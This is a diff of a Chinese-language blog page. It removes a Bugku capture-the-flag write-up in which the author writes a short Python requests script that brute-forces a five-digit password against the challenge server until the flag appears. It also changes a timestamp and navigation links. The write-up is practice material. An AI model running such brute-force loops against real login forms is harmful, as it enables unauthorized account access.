@@ -94,7 +94,7 @@
           <h2 class="title-sub-wrap">
             <strong>b1nz</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-05-07T17:05:21.339Z" itemprop="datePublished">2022-05-08</time>
+            <time  class="article-date" datetime="2022-05-07T18:18:45.421Z" itemprop="datePublished">2022-05-08</time>
           </h2>
           <ul class="wrap-list dark">
   
@@ -127,64 +127,14 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h1 id="bugku1-py爆破初尝试"><a href="#bugku1-py爆破初尝试" class="headerlink" title="bugku1 py爆破初尝试"></a>bugku1 py爆破初尝试</h1><blockquote>
-<p>B1nz碎碎念 太久不干活的后果就是连自己设置的快捷键都忘光光 </p>
-</blockquote>
-<blockquote>
-<p>参考资料：</p>
-</blockquote>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://docs.python-requests.org/zh_CN/latest/user/quickstart.html">https://docs.python-requests.org/zh_CN/latest/user/quickstart.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51641607/article/details/115754083">https://blog.csdn.net/m0_51641607/article/details/115754083</a></p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220508011420.png"></p>
-<p>这道题点进去看到是这样的</p>
-<p>简单粗暴的爆破题目</p>
-<p>但是here’s the problem</p>
-<p>一杯茶一根烟，bp一开爆一天</p>
-<p>借此契机来试试看写个py脚本来爆破吧~</p>
-<p>先抓个包看看：</p>
-<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/1651944173(1).png"></p>
-<p>ok啦开始写脚本：</p>
-<p>这里学习到了一个新函数叫：</p>
-<pre><code>str.zfill()
-</code></pre>
-<p>这个</p>
-<p>代码如下：</p>
-<pre><code>import requests
-def bomb():
-    url = &#39;http://114.67.175.224:10583/&#39;
-    for i in range(0,99999):
-        pwd = str(i)
-        pwd = pwd.zfill(5)
-        r = requests.post(url, data=&#123;&#39;pwd&#39;:pwd&#125;)
-        r.encoding = &#39;utf-8&#39;
-        wrong = &quot;密码不正确，请重新输入&quot;
-        if (wrong in r.text):
-            print(&quot;密码：&#123;&#125;,状态码:&#123;&#125;,dammn不是这个&quot;.format(pwd,r.status_code))
-        else:
-            print(&quot;密码：&#123;&#125;,状态码:&#123;&#125;,hooray!!&quot;.format(pwd,r.status_code))
-            print(&quot;结束！辛苦了b1nz&quot;)
-            break
-
-bomb()
-</code></pre>
-<p>有序运行中~</p>
-<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220508015641.png"></p>
-<blockquote>
-<p>我听了一整张tyga的专都没爆完  疲倦了（香烟）</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220508020900.png"></p>
-<p>o可o可</p>
-<p>输入得到flag</p>
-<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220508021024.png"></p>
-<p>今天也成功掉发了呢！散会！</p>
-
+        
       </section>
 
       
       
         <nav class="article-nav">
           
+          
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
@@ -192,25 +142,8 @@ bomb()
     
     <div class="card-text">
       
-        <a href="/2022/05/08/bugku2/" itemprop="url">
+        <a href="/2022/05/08/bugku1/" itemprop="url">
           <h2 class="card-text--title text-ellipsis">bugku1 py爆破初尝试</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
-          
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-      <div class="card-cover" background-image-lazy data-img="/cover.jpg"></div>
-    
-    <div class="card-text">
-      
-        <a href="/2022/05/03/xss1/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">见框就插之XSS</h2>
         </a>
       
       <div class="card-text--row">Older</div>
